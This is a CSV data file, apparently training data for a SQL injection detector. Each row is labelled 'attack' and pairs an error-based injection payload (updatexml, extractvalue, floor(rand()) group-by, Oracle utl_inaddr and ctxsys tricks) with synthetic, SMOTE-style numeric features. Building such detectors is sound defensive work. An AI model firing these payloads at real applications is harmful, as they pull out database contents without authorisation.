id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000761,attack,error,"1'+  (  select pdfv where 1172  =  1172 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   +'",nearest_attack_euclidean,R000155,0.008115434632300042,186.01322952597877,32.0,3.8618601173333897,49.0,47.0,66.0,24.013229525978787,0.2634223219293937,0.2526703904220715,0.3548137397416324,0.1290935479069024,2.013229525978786,0.0,0.0,0.0,1.1102230246251565e-16,2.0,0.0,12.0,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,4.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,2.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000762,attack,error,"1%'   )    )    or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000045,1.5040153794587185,323.2014468629876,37.622302603499314,3.911671255779593,104.02157917200552,55.0,125.44605206998622,38.73381562099587,0.3224142870396277,0.1702983724022502,0.3876010562385208,0.11968628431960125,4.0,0.0,0.0,0.0,2.0,2.0,0.0,22.489210413997245,1.2446052069986224,-1.1102230246251565e-16,6.0,5.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000763,attack,error,"1'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   'adnz'  =  'adnz",nearest_attack_euclidean,R000126,1.5860190052570011,335.05253183693407,38.02626591846704,3.870010783467039,106.10506367386816,58.89493632613185,133.0,37.05253183693407,0.31662191529242134,0.17585571587202983,0.39696681784770915,0.11055555098783966,2.052531836934075,0.0,0.0,0.0,2.0,2.0,0.0,24.0,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,5.0,0.5131329592335188,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000764,attack,error,"1""   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   ""vdyr""  =  ""vdyr",nearest_attack_euclidean,R000077,1.0986580807391806,331.65734720043395,38.74558796192542,3.920039331270523,107.71029165732882,55.0,129.9470555431051,39.0,0.32468223055696277,0.16596407151688516,0.3916700835778153,0.11768361434833674,0.0,4.0,0.0,0.0,2.0,2.0,0.0,23.49117592385085,0.5088240761491492,-1.1102230246251565e-16,6.0,5.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,0.0,1.0,1.7455879619254255,0.25441203807457446,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000765,attack,error,"1 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  # vojr",nearest_attack_euclidean,R000119,2.007159680802564,302.47514786297296,38.19060651712837,4.000887993046358,104.83287719005068,55.0,110.02348370717905,32.61878696574325,0.3465227235602018,0.1819545528795964,0.3637781012660681,0.10774462229413373,1.6187869657432463,0.0,0.0,0.0,2.0,1.4046967414358116,0.0,20.0,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,4.404696741435812,0.4046967414358116,0.0,0.0,0.5953032585641884,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,0.0,1.0,0.4046967414358116,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,13.404696741435812
SMOTE_000766,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000001,0.7865558343958413,214.55223596997212,42.0,4.298581870383979,117.31840575442277,2.0,71.0,24.23383021554936,0.5467087515488238,0.009325655767087826,0.33106077973161796,0.11290481295247043,3.0,0.0,0.0,0.0,1.1102230246251565e-16,3.0,0.0,10.0,2.7755575615628914e-17,4.850745323324043,1.0,3.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,2.7755575615628914e-17,2.0,0.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000767,attack,error,"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and 'tuzl'  =  'tuzl",nearest_attack_euclidean,R000102,0.21265960416975627,209.12371309683203,31.123713096832017,3.9563950534124026,77.49485238732807,37.0,71.75257380633596,22.876286903167983,0.3705604520504785,0.17692920062468023,0.34311644070522473,0.1093939066196166,4.0,0.0,0.0,0.0,1.1102230246251565e-16,1.876286903167982,0.0,12.0,2.7755575615628914e-17,-1.1102230246251565e-16,5.0,1.8762869031679825,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000768,attack,error,"1""  )   where 1392  =  1392 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",nearest_attack_euclidean,R000107,0.278887540244717,218.29535975096414,33.176160062258965,3.9571276669276547,73.4715198132231,45.0,76.82383993774103,23.0,0.3364356286896342,0.20620938181680287,0.35195908323164143,0.10539590626192148,0.0,1.0,2.0,0.0,1.1102230246251565e-16,2.0,0.0,13.0,2.7755575615628914e-17,-1.1102230246251565e-16,5.0,4.0,0.0,1.0,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000769,attack,error,"1""   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""gcyp"" like ""gcyp",nearest_attack_euclidean,R000091,0.17574331236617563,187.16894211248837,32.0,3.704840659017908,52.481329105142265,34.79371609779617,75.68761300734609,24.206283902203825,0.2803311145639882,0.1860723083916785,0.4042911531577347,0.12930542388659863,0.0,4.0,0.0,0.0,0.06876130073460895,1.0,0.0,14.137522601469218,2.7755575615628914e-17,-1.1102230246251565e-16,4.931238699265391,1.0687613007346082,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.1375226014692177,0.0,0.0,0.06876130073460873,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.206283902203825
SMOTE_000770,attack,error,"1""  )   where 1392  =  1392 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",nearest_attack_euclidean,R000107,2.396500933440887,214.0254929238148,34.97450707618521,3.8324646281876458,63.20394339051832,42.563732309536974,83.30880307138906,24.94901415237042,0.29514221708419236,0.19882203875922666,0.389419264071159,0.11661648008542198,0.0,1.0,2.0,0.0,0.48725353809260485,2.0,0.0,14.461760614277814,2.7755575615628914e-17,-1.1102230246251565e-16,4.512746461907395,4.487253538092605,0.0,1.0,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.9745070761852097,0.0,1.0,0.4872535380926049,0.48725353809260485,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5127464619073951,0.5127464619073951,5.97450707618521
SMOTE_000771,attack,error,"1'  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000139,1.4018750345233575,333.8167415566724,33.40837077833621,3.4636606859971883,80.59162922166378,50.22511233500864,146.0,57.0,0.24143119057616041,0.15044544907248378,0.4373695104004825,0.1707538499508733,0.5916292216637862,0.0,0.4083707783362137,0.0,1.1102230246251565e-16,2.0,0.0,31.0,2.7755575615628914e-17,-1.1102230246251565e-16,1.0,22.408370778336213,0.5916292216637863,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.5916292216637862,0.40837077833621377,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000772,attack,error,1%'  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  '%'  =  ',nearest_attack_euclidean,R000113,1.264917249604533,346.7668180427071,33.24663639145859,3.5620543583480173,90.02690886833129,45.986545565834355,148.0,62.753363608541406,0.2595658408418806,0.1326514782094144,0.4268163845856318,0.18096629636307318,3.0134544341656424,0.986545565834357,0.0,0.0,1.1102230246251565e-16,3.0,0.0,30.0,2.0,2.260090825624232,0.24663639145858962,22.999999999999996,0.7533636085414107,0.24663639145858926,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000773,attack,error,"1""   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  ""hbgr"" like ""hbgr",nearest_attack_euclidean,R000096,0.6356719800242342,346.6229270991741,38.62292709917408,3.8695853810381817,111.49170839669631,55.0,139.75414580165184,40.37707290082592,0.32164408431849334,0.15867417675488854,0.4031925315785843,0.11648920734803378,0.0,4.0,0.0,0.0,2.0,1.3770729008259237,0.0,26.0,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,4.377072900825924,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000774,attack,error,"1'  )   where 6056  =  6056 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",nearest_attack_euclidean,R000057,0.5434711524333349,319.3562565761494,39.169532072018676,3.997678841615351,104.01719243211204,63.0,117.33906414403735,35.0,0.32567207591608055,0.19728899791355664,0.367433927329498,0.1096049988408648,0.8304679279813264,0.1695320720186736,2.0,0.0,2.0,2.0,0.0,21.0,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,7.0,0.8304679279813263,0.16953207201867357,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000775,attack,error,"1""   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  ""ymhg""  =  ""ymhg",nearest_attack_euclidean,R000085,0.5964681460291024,346.35381766247565,38.35381766247566,3.8630228989780506,110.41527064990267,55.0,140.29236467504867,40.64618233752434,0.3187862730893744,0.15879745488634073,0.405059634914942,0.11735663710934281,0.0,4.0,0.0,0.0,2.0,1.6461823375243334,0.0,26.0,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,4.646182337524333,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000776,attack,error,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'owwf'  =  'owwf",nearest_attack_euclidean,R000084,0.5807591493350306,318.0939015668098,37.348222946674845,3.9892554736429413,109.17411147333743,55.0,117.87512125344782,36.044668840024535,0.34372540741981644,0.17318624301545724,0.3698683491652462,0.11322000039948009,4.0,0.0,0.0,0.0,2.0,2.0,0.0,21.044668840024535,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,5.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,0.0,1.0,1.1741114733374223,0.8258885266625777,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000777,attack,error,"1'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   'ayqn' like 'ayqn",nearest_attack_euclidean,R000054,0.21823136183159392,186.93666662686172,30.0,3.6804612755323634,48.583703721394784,39.0,74.04074069651304,25.312222208953912,0.2600405907764876,0.20867025093885835,0.395925037380494,0.13536412090416003,4.0,0.0,0.0,0.0,1.1102230246251565e-16,1.1040740696513036,0.0,14.208148139302608,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,1.1040740696513032,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000778,attack,error,"1""  )   as fkco where 8877  =  8877 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",nearest_attack_euclidean,R000056,0.04324391489361372,286.98210355778974,40.01789644221027,4.0258772714541005,107.0,43.0,103.0,33.98210355778973,0.37284562899681417,0.1498351593164767,0.35890747464179307,0.11841173704491606,0.0,0.9821035577897241,2.0,0.0,2.0,2.0,0.0,19.0,2.7755575615628914e-17,2.0,5.0,6.0,0.0,0.982103557789724,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000779,attack,error,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'kdxg' like 'kdxg",nearest_attack_euclidean,R000050,0.8015208072410895,312.52844220930524,37.52844220930522,4.048146578474672,111.11376883722087,55.0,111.94311558138956,34.47155779069478,0.35552240186367084,0.1759844318678649,0.35819138702938946,0.1103017792390748,4.0,0.0,0.0,0.0,2.0,1.4715577906947837,0.0,20.0,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,4.471557790694783,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000780,attack,error,"1'||  (  select 'vsfg' where 3547  =  3547 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   ||'",nearest_attack_euclidean,R000048,0.019654837118676684,189.97376537384048,34.980324030380366,3.975945788192892,49.0,47.0,66.0,27.973765373840486,0.2579311119604363,0.24740331147225514,0.34741741610997534,0.14724816045733327,3.986882686920242,0.0,0.0,0.0,1.1102230246251565e-16,2.0,0.0,12.0,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,5.986882686920242,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.9934413434601211,2.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000781,attack,error,"1'   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  'eugs'  =  'eugs",nearest_attack_euclidean,R000025,1.3766188515922597,192.42840195875522,27.607100489688804,3.4661641731194495,42.678105386576846,39.71479412373435,84.21420097937761,25.821301469066412,0.2215251642141729,0.20671937035941484,0.43763268647599196,0.13412277895042032,2.428401958755217,0.0,0.0,0.0,1.1102230246251565e-16,2.0,0.0,16.0,2.7755575615628914e-17,-1.1102230246251565e-16,5.392899510311196,2.0,0.6071004896888044,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000782,attack,error,"1'+  (  select zpns where 6922  =  6922 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'",nearest_attack_euclidean,R000070,1.4555452889284557,281.1654750666851,36.65399811824038,4.000697500824539,105.94299153208172,39.97149576604086,101.60649106164182,33.64449670692067,0.3771164214131618,0.1419278598876847,0.36140073306997467,0.11955498562917881,1.3269990591201917,0.0,0.0,0.0,2.0,1.6634995295600958,0.0,19.32699905912019,2.7755575615628914e-17,2.0,5.0,4.990498588680287,0.663499529560096,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.6634995295600956,0.0,0.6634995295600958,2.0,0.6634995295600958,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,9.990498588680287
SMOTE_000783,attack,error,"1'+  (  select 'bmit' where 3716  =  3716 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x   )    )   +'",nearest_attack_euclidean,R000037,0.6809233519164835,340.5353864189703,40.53538641897028,4.050504380520953,114.0,63.0,124.0,39.53538641897028,0.3347692290010095,0.18500404760582106,0.36413495084320335,0.11609177254996605,4.0,0.0,0.0,0.0,2.0,2.0,0.0,22.0,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,7.535386418970281,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.2676932094851403,7.0,3.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,15.0
SMOTE_000784,attack,error,"1'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'iwkg'  =  'iwkg",nearest_attack_euclidean,R000147,0.5555067573741186,285.74372200651686,38.0,4.007407047619782,107.85741312703651,36.371861003258424,105.51444787622191,36.0,0.3774899802670153,0.12712819402358916,0.36934065185821446,0.12604117385118113,3.6570347491853945,0.0,0.0,0.0,2.0,2.0,0.0,20.0,2.7755575615628914e-17,2.0,5.0,4.342965250814606,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.171482625407303,0.0,0.17148262540730275,2.0,1.0,0.8285173745926973,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.171482625407304
